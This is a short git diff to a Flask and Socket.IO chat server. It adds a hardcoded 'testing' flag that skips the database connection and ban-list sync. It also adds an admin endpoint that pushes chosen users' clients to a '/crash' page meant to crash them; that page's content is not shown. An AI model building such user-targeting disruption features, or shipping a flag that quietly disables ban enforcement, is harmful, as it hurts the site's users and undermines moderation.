@@ -130,8 +130,12 @@ db_config = {
     'database': os.getenv('DB_NAME'),
 }
 
+testing = True
+
 db_pool = None
 while db_pool is None:
+    if testing:
+        break
     try:
         print("Attempting to connect to the database...")
         db_pool = mysql.connector.pooling.MySQLConnectionPool(pool_name="chat_pool",
@@ -421,6 +425,9 @@ def get_real_ip(request_obj):
     return request_obj.remote_addr
 
 def sync_ban_list_from_db():
+    if testing:
+        return
+    
     print("SYNCING BAN LIST: Reloading active bans from database into cache...")
     
     conn = None
@@ -814,6 +821,10 @@ def get_ban_expiry(duration_str):
         return datetime.datetime.utcnow() + datetime.timedelta(weeks=1)
     return None
 
+@app.route('/crash', methods=["GET"])
+def hell():
+    return render_template('pain.html')
+
 @app.route('/admin', methods=['GET'])
 def admin_panel():
     if session.get('is_admin'):
@@ -1052,6 +1063,22 @@ def jumpscare_file(filename):
         abort(404)
 
     return send_file(safe_path), 200
+
+@app.route("/admin/crash-users", methods=["POST"])
+@admin_required
+def crash_users():
+    data = request.get_json()
+    if not data or 'users' not in data:
+        return jsonify({"message": "Invalid request. 'users' key is missing."}), 400
+
+    users_to_crash = data['users']
+
+    for user in users_to_crash:
+        print(f"Crashing {user}")
+        socketio.emit('openURI', {'uri': "crash"}, room=globals.users_with_sid.get(user))
+
+    return jsonify({"message": "User(s) have been crashed."}), 200
+
 
 def run_scheduled_task():
     scheduler_thread = Thread(target=schedule_task)
